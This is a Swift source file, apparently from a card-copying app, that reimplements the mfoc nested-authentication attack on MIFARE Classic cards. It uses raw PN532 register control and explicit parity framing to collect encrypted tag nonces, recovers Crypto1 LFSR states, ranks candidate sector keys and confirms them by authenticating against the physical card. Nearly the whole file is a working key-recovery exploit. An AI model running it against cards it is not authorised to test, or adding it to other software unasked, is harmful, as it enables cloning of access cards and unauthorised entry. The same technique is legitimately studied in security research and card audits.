import Foundation

/// Bit-level framing helpers for raw ISO 14443-A transmission with explicit
/// parity, matching the wire framing used by libnfc/pn53x transceive-bits.
/// Each data byte is followed on the air by its odd-parity bit (9 bits per
/// data byte); bytes are packed and bit-mirrored for the PN532 FIFO.
enum MifareBitFraming {
    static func mirror(_ x: UInt8) -> UInt8 {
        var result: UInt8 = 0
        var value = x
        for _ in 0 ..< 8 {
            result = (result << 1) | (value & 1)
            value >>= 1
        }
        return result
    }

    /// Total air bits for `dataBits` data bits (one parity bit per 8).
    static func frameBits(forDataBits dataBits: Int) -> Int {
        dataBits + dataBits / 8
    }

    /// Wrap data bytes + per-byte parity bits into the PN532 raw transmit frame.
    static func wrapFrame(data: Data, parity: [UInt8]) -> Data {
        let tx = [UInt8](data)
        let dataBits = tx.count * 8
        if dataBits < 9 { return Data([tx[0]]) }
        var frame = Data(repeating: 0, count: tx.count + 1)
        var uiDataPos = 0
        var bitsLeft = dataBits
        while true {
            var frameByte: UInt8 = 0
            var bitPos = 0
            while bitPos < 8 {
                let btData = mirror(tx[uiDataPos])
                frameByte |= (btData >> bitPos)
                frame[uiDataPos] = mirror(frameByte)
                frameByte = UInt8(truncatingIfNeeded: Int(btData) << (8 - bitPos))
                frameByte |= ((parity[uiDataPos] & 1) << (7 - bitPos))
                frame[uiDataPos + 1] = mirror(frameByte)
                uiDataPos += 1
                if bitsLeft < 9 {
                    return Data(frame.prefix(uiDataPos + 1))
                }
                bitsLeft -= 8
                bitPos += 1
            }
        }
    }

    /// Unwrap a received raw frame (including interleaved parity bits) into
    /// data bytes and their parity bits.
    static func unwrapFrame(frame: Data, frameBits: Int) -> (data: Data, parity: [UInt8]) {
        let padded = [UInt8](frame) + [0, 0]
        if frameBits < 9 { return (Data([padded[0]]), []) }
        let rxBytes = (frameBits - frameBits / 9) / 8
        var data = [UInt8]()
        var parity = [UInt8]()
        data.reserveCapacity(rxBytes)
        parity.reserveCapacity(rxBytes)
        var uiDataPos = 0
        var bitsLeft = frameBits
        while true {
            var bitPos = 0
            while bitPos < 8 && data.count < rxBytes {
                let b0 = mirror(padded[uiDataPos])
                var btData = UInt8(truncatingIfNeeded: Int(b0) << bitPos)
                let b1 = mirror(padded[uiDataPos + 1])
                btData |= UInt8(truncatingIfNeeded: Int(b1) >> (8 - bitPos))
                data.append(mirror(btData))
                parity.append((b1 >> (7 - bitPos)) & 1)
                uiDataPos += 1
                if bitsLeft < 9 {
                    return (Data(data), parity)
                }
                bitsLeft -= 9
                bitPos += 1
            }
            if data.count >= rxBytes {
                return (Data(data), parity)
            }
        }
    }
}

/// Minimal transport surface used by the nested-attack session. `WCopyReader`
/// conforms; a simulator can drive the algorithm in unit tests.
protocol NestedRecoveryTransport {
    var requiresSAMConfiguration: Bool { get }
    func rawPN532(_ bytes: Data) throws -> Data
    func readRegister(_ address: UInt16) throws -> UInt8
    func writeRegister(_ address: UInt16, value: UInt8) throws
    func transceiveRawBits(data: Data, parity: [UInt8], timeout: TimeInterval) throws -> (data: Data, parity: [UInt8])
    func authenticate(block: Int, uid: Data, key: Data, type: KeyType) throws -> Bool
    func readBlock(_ block: Int) throws -> Data?
}

extension NestedRecoveryTransport {
    var requiresSAMConfiguration: Bool { true }
}

/// Native reimplementation of the mfoc nested-authentication key recovery,
/// driven directly through the wCopy/PN532 raw InCommunicateThru interface.
/// Mirrors the reference `mf_enhanced_auth` flow (distance mode and recovery
/// mode) and the lfsr-recovery candidate search.
final class NestedRecoverySession {
    private let transport: NestedRecoveryTransport
    private let target: CardTarget
    private let logger: (String) -> Void

    // PN53x CIU register addresses
    private static let ciuTxMode: UInt16     = 0x6302
    private static let ciuRxMode: UInt16     = 0x6303
    private static let ciuManualRCV: UInt16  = 0x630D
    private static let ciuStatus2: UInt16    = 0x6338
    private static let ciuControl: UInt16    = 0x633C
    private static let ciuBitFraming: UInt16 = 0x633D

    init(transport: NestedRecoveryTransport, target: CardTarget, logger: @escaping (String) -> Void) {
        self.transport = transport
        self.target = target
        self.logger = logger
    }

    private var uidLast4: UInt32 {
        let uid = target.uid
        guard uid.count >= 4 else { return 0 }
        var value: UInt32 = 0
        for i in (uid.count - 4) ..< uid.count {
            value = (value << 8) | UInt32(uid[i])
        }
        return value
    }

    private func keyToUInt64(_ data: Data) -> UInt64 {
        var value: UInt64 = 0
        for byte in data { value = (value << 8) | UInt64(byte) }
        return value
    }

    private func keyHex(_ value: UInt64) -> String {
        String(format: "%012llX", value)
    }

    // MARK: - Register helpers

    private func readModifyWrite(_ address: UInt16, clearMask: UInt8, setMask: UInt8) throws {
        let current = try transport.readRegister(address)
        try transport.writeRegister(address, value: (current & ~clearMask) | setMask)
    }

    // MARK: - Device configuration

    /// Reset the reader into initiator mode with chip CRC/parity handling on and
    /// the RF field re-powered, then reselect the card. Mirror of mf_configure.
    func configureForAuth() throws {
        if transport.requiresSAMConfiguration {
            _ = try transport.rawPN532(Data([0xD4, 0x14, 0x01, 0x14, 0x01]))
        } else {
            logger("PM6 已完成 HID 初始化，复用当前模式，跳过无响应的重复 SAMConfig")
        }
        try transport.writeRegister(Self.ciuBitFraming, value: 0x00)
        try readModifyWrite(Self.ciuTxMode, clearMask: 0x80, setMask: 0x80)
        try readModifyWrite(Self.ciuRxMode, clearMask: 0x80, setMask: 0x80)
        try readModifyWrite(Self.ciuManualRCV, clearMask: 0x10, setMask: 0x00)
        try readModifyWrite(Self.ciuStatus2, clearMask: 0x08, setMask: 0x00)
        try transport.writeRegister(Self.ciuControl, value: 0x10)
        _ = try transport.rawPN532(Data([0xD4, 0x32, 0x01, 0x00]))
        Thread.sleep(forTimeInterval: 0.005)
        _ = try transport.rawPN532(Data([0xD4, 0x32, 0x01, 0x01]))
        Thread.sleep(forTimeInterval: 0.010)
        let selection = try transport.rawPN532(Data([0xD4, 0x4A, 0x01, 0x00]))
        guard selection.count >= 8, selection[0] == 0xD5, selection[1] == 0x4B, selection[2] > 0 else {
            throw AppError.noCard
        }
        let uidLength = Int(selection[7])
        guard selection.count >= 8 + uidLength,
              selection.subdata(in: 8..<(8 + uidLength)) == target.uid else {
            throw AppError.operation("Recovery stopped: card changed")
        }
    }

    /// Restore chip CRC/parity handling after raw exchanges.
    func restoreNormal() throws {
        try readModifyWrite(Self.ciuTxMode, clearMask: 0x00, setMask: 0x80)
        try readModifyWrite(Self.ciuRxMode, clearMask: 0x00, setMask: 0x80)
        try readModifyWrite(Self.ciuManualRCV, clearMask: 0x00, setMask: 0x00)
    }

    private func disableCRC() throws {
        try readModifyWrite(Self.ciuTxMode, clearMask: 0x80, setMask: 0x00)
        try readModifyWrite(Self.ciuRxMode, clearMask: 0x80, setMask: 0x00)
    }

    private func enableCRC() throws {
        try readModifyWrite(Self.ciuTxMode, clearMask: 0x00, setMask: 0x80)
        try readModifyWrite(Self.ciuRxMode, clearMask: 0x00, setMask: 0x80)
    }

    private func disableParity() throws {
        try readModifyWrite(Self.ciuManualRCV, clearMask: 0x00, setMask: 0x10)
    }

    // MARK: - Transceive

    private func transceiveRaw(_ tx: Data, timeout: TimeInterval = 1.0) throws -> Data {
        guard tx.count <= 265 else { throw AppError.operation("D4 42 数据过长") }
        var command = Data([0xD4, 0x42])
        command.append(tx)
        let response = try transport.rawPN532(command)
        guard response.count >= 3, response[0] == 0xD5, response[1] == 0x43 else {
            throw AppError.operation("InCommunicateThru 响应格式错误")
        }
        let status = response[2]
        guard status == 0x00 else {
            throw AppError.operation("InCommunicateThru 失败 status=0x\(String(format: "%02X", status))")
        }
        var rx = response.subdata(in: 3 ..< response.count)
        if rx.suffix(2) == Data([0x90, 0x00]) {
            rx.removeLast(2)
        }
        return rx
    }

    /// Send raw data bits with explicit parity and recover the received bits.
    private func transceiveBits(_ data: Data, parity: [UInt8], timeout: TimeInterval = 1.5) throws -> (data: Data, parity: [UInt8]) {
        try transport.transceiveRawBits(data: data, parity: parity, timeout: timeout)
    }

    // MARK: - Crypto helpers

    private func bytesToUInt32(_ data: Data) -> UInt32 {
        var value: UInt32 = 0
        for byte in data.prefix(4) { value = (value << 8) | UInt32(byte) }
        return value
    }

    /// Encrypt one plaintext byte with the current state (feeding zero into the
    /// cipher, matching mfoc's `crypto1_byte(pcs, 0, 0) ^ byte` pattern).
    private func appendEncryptedByte(_ state: inout Crypto1.State, plaintext: UInt8, to data: inout Data, parity: inout [UInt8]) {
        let encrypted = Crypto1.byte(&state, input: 0, isEncrypted: false) ^ plaintext
        data.append(encrypted)
        parity.append(Crypto1.filter(state.odd) ^ Crypto1.oddParity8(plaintext))
    }

    /// Build the encrypted Nr + Ar header (8 bytes) for a nonce, advancing the
    /// state. Returns the PRNG nonce after the header bytes.
    private func encryptHeader(state: inout Crypto1.State, nt: UInt32) -> (data: Data, parity: [UInt8], ntForward: UInt32) {
        var header = Data()
        var headerParity = [UInt8]()
        for _ in 0 ..< 4 {
            appendEncryptedByte(&state, plaintext: 0, to: &header, parity: &headerParity)
        }
        var ntForward = Crypto1.prngSuccessor(nt, 32)
        for _ in 0 ..< 4 {
            ntForward = Crypto1.prngSuccessor(ntForward, 8)
            appendEncryptedByte(&state, plaintext: UInt8(ntForward & 0xFF), to: &header, parity: &headerParity)
        }
        return (header, headerParity, ntForward)
    }

    /// Encrypt a 4-byte MIFARE AUTH command (opcode, block, CRC) with the state.
    private func encryptAuthCommand(state: inout Crypto1.State, authByte: UInt8, block: Int) -> (data: Data, parity: [UInt8]) {
        let command = Data([authByte, UInt8(block)])
        let crc = Crypto1.crc14443A(command)
        var payload = Data(command)
        payload.append(UInt8(crc & 0xFF))
        payload.append(UInt8(crc >> 8))
        var encrypted = Data()
        var encryptedParity = [UInt8]()
        for byte in payload {
            appendEncryptedByte(&state, plaintext: byte, to: &encrypted, parity: &encryptedParity)
        }
        return (encrypted, encryptedParity)
    }

    // MARK: - Base authentication

    /// Perform a complete authentication to the exploit sector and return the
    /// tag nonce and the synchronized cipher state.
    private func performBaseAuth(exploitKey: UInt64, exploitType: KeyType, exploitTrailer: Int) throws -> (nt: UInt32, state: Crypto1.State) {
        let authByte: UInt8 = exploitType == .a ? 0x60 : 0x61
        // Plain AUTH with our own CRC and chip CRC handling disabled, matching
        // mfoc's request-plain-nonce step. The card answers with nt + CRC.
        let command = Data([authByte, UInt8(exploitTrailer)])
        let crc = Crypto1.crc14443A(command)
        var auth = Data(command)
        auth.append(UInt8(crc & 0xFF))
        auth.append(UInt8(crc >> 8))
        try disableCRC()
        let rx = try transceiveRaw(auth)
        try enableCRC()
        guard rx.count >= 4 else { throw AppError.operation("明文 nonce 接收长度不足（\(rx.count) 字节）") }
        let nt = bytesToUInt32(rx)

        var state = Crypto1.create(key: exploitKey)
        _ = Crypto1.word(&state, input: nt ^ uidLast4, isEncrypted: false)

        let header = encryptHeader(state: &state, nt: nt)
        try disableCRC()
        try disableParity()
        let at = try transceiveBits(header.data, parity: header.parity)
        try restoreNormal()
        guard at.data.count >= 4 else { throw AppError.operation("At 响应长度不足") }
        let ntForward = Crypto1.prngSuccessor(header.ntForward, 32)
        let expectedAt = Crypto1.word(&state, input: 0, isEncrypted: false) ^ (ntForward & 0xFFFFFFFF)
        guard bytesToUInt32(at.data) == expectedAt else {
            throw AppError.operation("At 验证失败：认证不匹配")
        }
        return (nt, state)
    }

    // MARK: - Distance mode

    /// Collect `numProbes` nested nonce distances using the exploit key and
    /// return the median distance (mfoc's 'd' mode).
    func collectDistances(
        exploitKey: Data,
        exploitType: KeyType,
        exploitSector: Int,
        numProbes: Int = 15
    ) throws -> Int {
        let keyU64 = keyToUInt64(exploitKey)
        let exploitTrailer = CardLayout.trailerBlock(of: exploitSector)
        let authByte: UInt8 = exploitType == .a ? 0x60 : 0x61
        let uid = uidLast4

        let base = try performBaseAuth(exploitKey: keyU64, exploitType: exploitType, exploitTrailer: exploitTrailer)
        var state = base.state
        var currentNt = base.nt
        try disableCRC()
        try disableParity()

        var distances: [Int] = []
        for _ in 0 ..< numProbes {
            let auth = encryptAuthCommand(state: &state, authByte: authByte, block: exploitTrailer)
            let rx = try transceiveBits(auth.data, parity: auth.parity)
            guard rx.data.count >= 4 else { throw AppError.operation("加密 nonce 响应长度不足") }
            let ntEnc = bytesToUInt32(rx.data)
            var decryptState = Crypto1.create(key: keyU64)
            let ntLast = ntEnc ^ Crypto1.word(&decryptState, input: ntEnc ^ uid, isEncrypted: true)
            guard Crypto1.validatePrngNonce(ntLast) else {
                throw AppError.operation("卡片 PRNG 不可预测，无法执行 Nested 恢复")
            }
            distances.append(Crypto1.nonceDistance(from: currentNt, to: ntLast))
            logger("Nested 距离 \(Crypto1.nonceDistance(from: currentNt, to: ntLast))（Nt' = \(String(format: "%08X", ntLast))）")

            let reply = encryptHeader(state: &decryptState, nt: ntLast)
            let at = try transceiveBits(reply.data, parity: reply.parity)
            guard at.data.count >= 4 else { throw AppError.operation("At 响应长度不足") }
            let ntForward = Crypto1.prngSuccessor(reply.ntForward, 32)
            let expectedAt = Crypto1.word(&decryptState, input: 0, isEncrypted: false) ^ (ntForward & 0xFFFFFFFF)
            guard bytesToUInt32(at.data) == expectedAt else {
                throw AppError.operation("At 响应验证失败")
            }
            currentNt = ntForward
            state = decryptState
        }
        try restoreNormal()

        let sorted = distances.sorted(by: >)
        guard !sorted.isEmpty else { throw AppError.operation("未收集到 nonce 距离") }
        let middle = sorted.count / 2
        let median = sorted.count % 2 == 1 ? sorted[middle] : sorted[middle - 1]
        // The FIRST distance is the base→first-nested measurement and matches the
        // recovery session's base→nested timing (which includes the plain-AUTH
        // register toggles). The remaining distances are between-nested intervals
        // and would under-estimate it on this reader.
        if abs(distances[0] - median) > median / 2, distances.count > 1 {
            logger("距离中位数 = \(median)；base→nested 距离 = \(distances[0])（采用 base→nested）")
            return distances[0]
        }
        logger("距离中位数 = \(median)")
        return median
    }

    // MARK: - Recovery mode

    /// Perform one nested authentication attempt against the target trailer and
    /// return the base nonce, the encrypted target nonce, and its parity bits.
    private func performRecoveryAuth(
        exploitKey: UInt64,
        exploitType: KeyType,
        exploitTrailer: Int,
        targetTrailer: Int,
        targetAuthByte: UInt8,
        warmups: Int = 0,
        token: CancellationToken? = nil
    ) throws -> (nt: UInt32, ntEnc: UInt32, parity: [UInt8]) {
        let base = try performBaseAuth(exploitKey: exploitKey, exploitType: exploitType, exploitTrailer: exploitTrailer)
        var state = base.state
        for _ in 0..<warmups {
            try token?.check()
            try disableCRC()
            try disableParity()
            let auth = encryptAuthCommand(state: &state, authByte: exploitType == .a ? 0x60 : 0x61, block: exploitTrailer)
            let rx = try transceiveBits(auth.data, parity: auth.parity)
            guard rx.data.count >= 4 else { throw AppError.operation("warmup nonce too short") }
            let enc = bytesToUInt32(rx.data)
            var nextState = Crypto1.create(key: exploitKey)
            let plain = enc ^ Crypto1.word(&nextState, input: enc ^ uidLast4, isEncrypted: true)
            guard Crypto1.validatePrngNonce(plain) else { throw AppError.operation("warmup nonce invalid") }
            let header = encryptHeader(state: &nextState, nt: plain)
            let at = try transceiveBits(header.data, parity: header.parity)
            let forwarded = Crypto1.prngSuccessor(header.ntForward, 32)
            let expected = Crypto1.word(&nextState, input: 0, isEncrypted: false) ^ forwarded
            guard at.data.count >= 4, bytesToUInt32(at.data) == expected else { throw AppError.operation("warmup At mismatch") }
            try restoreNormal()
            state = nextState
        }
        try disableCRC()
        try disableParity()
        let auth = encryptAuthCommand(state: &state, authByte: targetAuthByte, block: targetTrailer)
        let rx = try transceiveBits(auth.data, parity: auth.parity)
        try restoreNormal()
        guard rx.data.count >= 4 else { throw AppError.operation("恢复 nonce 响应长度不足") }
        let ntEnc = bytesToUInt32(rx.data)
        let parity = (0 ..< 3).map { i -> UInt8 in
            let received = rx.parity.count > i ? rx.parity[i] : 0
            return Crypto1.oddParity8(rx.data[i]) != received ? 1 : 0
        }
        return (base.nt, ntEnc, parity)
    }

    /// Candidate generation alone is not success; callers must authenticate the result.
    static func calibratedCandidates(plaintext: UInt32, encrypted: UInt32, uid: UInt32,
                                     token: CancellationToken? = nil) throws -> Set<UInt64> {
        try token?.check()
        let input = plaintext ^ uid
        let states = Crypto1.lfsrRecovery32(plaintext ^ encrypted, input: input)
        var keys = Set<UInt64>()
        for (index, original) in states.enumerated() {
            if index.isMultiple(of: 4096) { try token?.check() }
            var state = original
            _ = Crypto1.rollbackWord(&state, input: input, fb: 0)
            keys.insert(Crypto1.getLFSR(from: state))
        }
        return keys
    }

    /// Calibrate each changed authentication sequence against a sector with a verified key.
    /// Unstable timing, invalid nonces/parity or an empty intersection are explicit misses.
    func recoverCalibratedKey(exploitSector: Int, exploitKey: Data, exploitType: KeyType,
                              targetSector: Int, targetType: KeyType, warmupStart: Int = 0,
                              samples: Int = 4, progress: ((Double, String) -> Void)? = nil,
                              token: CancellationToken? = nil) throws -> String? {
        guard (2...6).contains(samples), (0...60).contains(warmupStart),
              exploitKey.count == 6 else { throw AppError.operation("无效的交叉采样参数") }
        let key = keyToUInt64(exploitKey)
        let exploitBlock = CardLayout.trailerBlock(of: exploitSector)
        var intersection: Set<UInt64>?
        var seenSamples = Set<String>()
        defer { try? restoreNormal() }
        for sample in 0..<samples {
            try token?.check()
            let warmups = warmupStart + sample
            progress?(Double(sample) / Double(samples), "扇区 \(targetSector) · 交叉采样 \(sample + 1)/\(samples)")
            var distances: [Int] = []
            for _ in 0..<2 {
                try token?.check()
                try configureForAuth()
                let control = try performRecoveryAuth(exploitKey: key, exploitType: exploitType,
                    exploitTrailer: exploitBlock, targetTrailer: exploitBlock,
                    targetAuthByte: exploitType == .a ? 0x60 : 0x61, warmups: warmups, token: token)
                var cipher = Crypto1.create(key: key)
                let plaintext = control.ntEnc ^ Crypto1.word(&cipher, input: control.ntEnc ^ uidLast4, isEncrypted: true)
                guard Crypto1.validatePrngNonce(plaintext),
                      Crypto1.validNonce(plaintext, control.ntEnc, plaintext ^ control.ntEnc, parity: control.parity) else {
                    throw AppError.operation("已知密钥对照未通过随机数/奇偶位校验，本轮停止")
                }
                distances.append(Crypto1.nonceDistance(from: control.nt, to: plaintext))
            }
            guard distances[0] > 0, distances[0] == distances[1] else {
                throw AppError.operation("已知扇区的采样距离不稳定，本轮不使用推测数据")
            }
            try configureForAuth()
            let captured = try performRecoveryAuth(exploitKey: key, exploitType: exploitType,
                exploitTrailer: exploitBlock, targetTrailer: CardLayout.trailerBlock(of: targetSector),
                targetAuthByte: targetType == .a ? 0x60 : 0x61, warmups: warmups, token: token)
            let plaintext = Crypto1.prngSuccessor(captured.nt, UInt32(distances[0]))
            guard Crypto1.validNonce(plaintext, captured.ntEnc, plaintext ^ captured.ntEnc, parity: captured.parity) else {
                logger("扇区 \(targetSector)：目标样本未通过校验，跳过，不生成密钥")
                continue
            }
            let signature = "\(plaintext):\(captured.ntEnc):\(captured.parity)"
            guard seenSamples.insert(signature).inserted else {
                logger("扇区 \(targetSector)：重复样本已跳过")
                continue
            }
            let keys = try Self.calibratedCandidates(plaintext: plaintext, encrypted: captured.ntEnc,
                                                     uid: uidLast4, token: token)
            intersection = intersection.map { $0.intersection(keys) } ?? keys
            logger("扇区 \(targetSector) 样本 \(sample + 1)：距离 \(distances[0])，交集 \(intersection!.count) 个候选")
            guard !intersection!.isEmpty else { return nil }
            if seenSamples.count >= 2, intersection!.count <= 50 {
                for candidate in intersection!.sorted() {
                    try token?.check()
                    try configureForAuth()
                    if try verify(key: candidate, sector: targetSector, type: targetType) {
                        let verified = keyHex(candidate)
                        logger("扇区 \(targetSector) Key \(targetType.rawValue) 已通过实卡认证")
                        progress?(1, "扇区 \(targetSector) 密钥已验证")
                        return verified
                    }
                }
            }
        }
        return nil
    }

    // MARK: - Candidate verification

    /// Verify a candidate key against the target sector on the real card.
    func verify(key: UInt64, sector: Int, type: KeyType) throws -> Bool {
        let trailer = CardLayout.trailerBlock(of: sector)
        let keyData = Data([
            UInt8((key >> 40) & 0xFF), UInt8((key >> 32) & 0xFF),
            UInt8((key >> 24) & 0xFF), UInt8((key >> 16) & 0xFF),
            UInt8((key >> 8) & 0xFF), UInt8(key & 0xFF)
        ])
        return try transport.authenticate(block: trailer, uid: target.uid, key: keyData, type: type)
    }

    // MARK: - Key recovery

    /// Recover the key for a target sector/key type using an exploit key.
    /// Returns up to `maxCandidates` candidate keys ordered by evidence count.
    /// The caller is expected to verify candidates against the card.
    func recoverKey(
        exploitSector: Int,
        exploitKey: Data,
        exploitType: KeyType,
        targetSector: Int,
        targetType: KeyType,
        probes: Int = 20,
        distanceProbes: Int = 15,
        sets: Int = 5,
        tolerance: Int = 20,
        maxCandidates: Int = 50,
        progress: ((Double, String) -> Void)? = nil,
        token: CancellationToken? = nil
    ) throws -> [String] {
        let keyU64 = keyToUInt64(exploitKey)
        let exploitTrailer = CardLayout.trailerBlock(of: exploitSector)
        let targetTrailer = CardLayout.trailerBlock(of: targetSector)
        let targetAuthByte: UInt8 = targetType == .a ? 0x60 : 0x61
        let uid = uidLast4

        var candidateCounts: [UInt64: Int] = [:]

        for probe in 0 ..< probes {
            try token?.check()
            progress?(Double(probe) / Double(probes), "探测 \(probe + 1)/\(probes)")

            try configureForAuth()
            let median: Int
            do {
                median = try collectDistances(
                    exploitKey: exploitKey,
                    exploitType: exploitType,
                    exploitSector: exploitSector,
                    numProbes: distanceProbes
                )
            } catch {
                logger("距离采样失败：\(error.localizedDescription)")
                try restoreNormal()
                continue
            }
            try restoreNormal()
            logger("距离中位数 = \(median)")

            for _ in 0 ..< sets {
                try token?.check()
                try configureForAuth()
                let recovery: (nt: UInt32, ntEnc: UInt32, parity: [UInt8])
                do {
                    recovery = try performRecoveryAuth(
                        exploitKey: keyU64,
                        exploitType: exploitType,
                        exploitTrailer: exploitTrailer,
                        targetTrailer: targetTrailer,
                        targetAuthByte: targetAuthByte
                    )
                } catch {
                    try restoreNormal()
                    continue
                }
                try restoreNormal()

                let lower = max(0, median - tolerance)
                var ntProbe = Crypto1.prngSuccessor(recovery.nt, UInt32(lower))
                var probeDistance = lower
                while probeDistance <= median + tolerance {
                    try token?.check()
                    let ks1 = recovery.ntEnc ^ ntProbe
                    if Crypto1.validNonce(ntProbe, recovery.ntEnc, ks1, parity: recovery.parity) {
                        let states = Crypto1.lfsrRecovery32(ks1, input: ntProbe ^ uid)
                        for var state in states {
                            _ = Crypto1.rollbackWord(&state, input: ntProbe ^ uid, fb: 0)
                            let candidate = Crypto1.getLFSR(from: state)
                            candidateCounts[candidate, default: 0] += 1
                        }
                    }
                    ntProbe = Crypto1.prngSuccessor(ntProbe, 1)
                    probeDistance += 1
                }
            }

            let ranked = candidateCounts.sorted { $0.value > $1.value }
            progress?(Double(probe + 1) / Double(probes), "候选密钥 \(ranked.count) 个")
            if let top = ranked.first {
                logger("探测 \(probe + 1) 完成：候选 \(ranked.count) 个，最高频 = \(keyHex(top.key))（\(top.value) 票）")
            }

            for (candidate, _) in ranked.prefix(maxCandidates) {
                try token?.check()
                if try verify(key: candidate, sector: targetSector, type: targetType) {
                    logger("扇区 \(targetSector) Key \(targetType.rawValue) 恢复成功 = \(keyHex(candidate))")
                    return [keyHex(candidate)]
                }
            }
        }

        let ranked = candidateCounts.sorted { $0.value > $1.value }
        return ranked.prefix(maxCandidates).map { keyHex($0.key) }
    }
}
